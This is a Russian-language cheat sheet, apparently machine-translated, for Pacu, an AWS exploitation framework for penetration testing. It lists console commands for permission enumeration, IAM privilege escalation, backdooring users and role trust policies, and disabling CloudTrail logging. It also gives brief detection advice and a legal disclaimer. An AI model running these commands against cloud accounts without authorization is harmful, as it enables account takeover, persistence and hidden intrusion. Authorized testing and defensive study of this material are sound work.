<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ Паку — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Лаборатории безопасности Rhino">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Cloud Security">
</p>

<p выравнивание="центр">
  <b>☁️ Платформа эксплуатации AWS с открытым исходным кодом, предназначенная для тестирования на проникновение в облачные среды, повышения привилегий, сбора учетных данных и разведки инфраструктуры.</b>
</p>

---

## 📋 Содержание

- [Обзор и архитектура](#-обзор--архитектура)
- [Установка](#-установка)
- [Управление сеансом и импорт ключей AWS](#-session-management--aws-key-import)
  - [Импорт скомпрометированных учетных данных](#importing-скомпрометированные-учетные данные)
  - [Предполагаемые роли и токены сеанса](#assumed-roles-and-session-tokens)
- [Модули разведки и перечисления](#-reconnaissance--enumeration-modules)
  - [Перечисление текущих разрешений IAM](#enumerating-current-iam-permissions)
  - [Сканирование экземпляров EC2 и сегментов S3](#scanning-ec2-instances--s3-buckets)
- [Методы повышения привилегий в AWS](#-privilege-escalation-techniques-in-aws)
  - [Сканер автоматического повышения привилегий](#automatic-privilege-escalation-scanner)
  - [Выполнение модулей эскалации](#executing-escalation-modules)
- [Настойчивость и уклонение от защиты](#-настойчивость--защита-уклонение)
  - [бэкдоринг ролей и пользователей IAM](#backdooring-iam-roles--users)
  - [Нарушение ведения журнала CloudTrail](#disrupting-cloudtrail-logging)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и обнаружение](#-защитные-соображения--обнаружение)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и архитектура

**Pacu**, созданный **Rhino Security Labs**, представляет собой «Metasploit для AWS». Он предназначен для имитации состязательной тактики в средах Amazon Web Services.

Паку использует локальную базу данных SQLite, которая сохраняет состояние во время наступательных сессий:
- **Модульный конвейер:** более 40 специализированных модулей, охватывающих обнаружение, горизонтальное перемещение, повышение привилегий, сохранение и эксфильтрацию.
- **Перечисление разрешений.** Анализирует политики IAM без срабатывания пороговых значений оповещений путем тестирования действий API или проверки прикрепленных управляемых политик.
- **Privesc Automation:** оценивает известные пути повышения разрешений IAM (например, `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥 Установка
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Управление сеансами и импорт ключей AWS

Когда Pacu запускается, вы попадаете в интерактивную консоль. Создайте или выберите сеанс:
```text
Pacu > set_session client_assessment
```
### Импорт скомпрометированных учетных данных
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Предполагаемые роли и токены сеанса
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Модули разведки и подсчета

### Перечисление текущих разрешений IAM
Определите, кто вы и какие действия разрешены активным учетным данным:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Сканирование экземпляров EC2 и сегментов S3
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Методы повышения привилегий в AWS

Повышение привилегий AWS основано на неправильно настроенных политиках IAM, которые позволяют пользователям, не являющимся администраторами, предоставлять себе или другим объектам административные права.

### Автоматический сканер повышения привилегий
Сканирует перечисленные вами разрешения на соответствие более чем 21 документированному вектору AWS privesc:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*Пример вывода выделяет уязвимые разрешения, такие как `iam:PutUserPolicy`, `iam:AttachUserPolicy` или `iam:CreateAccessKey`.*

### Выполнение модулей эскалации
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Настойчивость и уклонение от защиты

### Backdooring роли и пользователи IAM
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Нарушение ведения журнала CloudTrail
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда Паку |
|-----------|--------------|
| **Установить/выбрать сеанс** | `set_session <NAME>` |
| **Импорт учетных данных AWS** | `set_keys` |
| **Показать текущую личность** | `whoami` |
| **Перечислить права IAM** | `run iam__enum_permissions` |
| **Сканирование векторов Privesc** | `run iam__privesc_scan` |
| **Перечислить сегменты S3** | `run s3__enum` |
| **Перечислить экземпляры EC2** | `run ec2__enum` |
| **Нарушение CloudTrail** | `run cloudtrail__disrupt_logging` |
| **Список доступных модулей** | `list` |

---

## 🛡️ Соображения по защите и обнаружению

1. **Мониторинг GuardDuty и CloudTrail.** Автоматическое повышение привилегий и сканирование разрешений Pacu генерируют быстрые последовательные запросы API, которые легко помечаются AWS GuardDuty.
2. **SCP и границы разрешений.** Обеспечьте соблюдение политик управления сервисами (SCP) организаций AWS, предотвращая вмешательство любого принципала, включая полноправных администраторов, в CloudTrail или изменение корневых структур организации.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Pacu разработан специально для авторизованных тестов на проникновение AWS и оценок безопасности. Тестирование облачных учетных записей без явного предварительного разрешения владельца актива нарушает Политику приемлемого использования Amazon Web Services и международное право.